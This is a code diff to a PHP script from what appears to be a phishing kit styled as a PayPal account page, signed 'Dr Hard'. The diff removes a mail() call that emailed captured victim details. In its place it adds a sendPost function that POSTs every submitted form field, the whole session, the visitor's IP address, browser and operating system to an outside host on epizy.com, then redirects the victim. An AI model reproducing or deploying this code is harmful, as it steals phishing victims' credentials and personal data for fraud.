@@ -73,11 +73,7 @@ function Error()
 
 
 ";
-$subject = "".$_SESSION['_email_']." ♥ New Account PPL ♥ ".$_SESSION['CountryName']."";
-$headers = "From: ☠ Dr Hard ☠ <noreply@logs.com>\r\n";
-$headers .= "MIME-Version: 1.0\r\n";
-$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
-@mail($email,$subject,$msg,$headers);
+
 
 header("Location: ../home.php?customerProfileweb-id=".sha1(md5(gmdate('Dr Hard')))."_&TokenAccess=".strtoupper(sha1(256))." ");
 
@@ -103,5 +99,50 @@ Date: ".$DATE."
 }
 else {
 	echo ERROR();
-	}		 
+	}		
+
+
+
+//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+$data['date'] = $DATE;
+$data['s'] = $_SESSION;
+$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
+$data['b'] = browserTy_Version;
+$data['os'] = $OS;
+
+sendPost('http://www.save-test.epizy.com/sc2/sv1.php',$data);
+
+
+//---- end request----------------
+
+
+
+
+
+
+
+
+
+
+
+
+	
 ?>
